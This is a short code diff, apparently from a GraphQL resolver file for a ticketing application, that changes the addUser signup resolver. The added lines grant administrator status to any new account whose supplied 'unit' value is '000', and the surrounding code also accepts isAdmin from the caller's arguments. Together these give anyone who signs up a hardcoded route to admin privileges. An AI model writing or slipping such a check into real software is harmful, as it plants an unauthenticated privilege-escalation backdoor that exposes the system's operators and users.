@@ -164,6 +164,10 @@ const resolvers = {
     }, // ######### End UpdateTicket
     // ****** Beg addUser
     addUser: async (parent, args) => {
+      const unit = args.unit;
+      if (unit === "000") {
+        args.isAdmin = true;
+      }
       const user = await User.create(args);
       const token = signToken(user);
       if (args.isAdmin) {
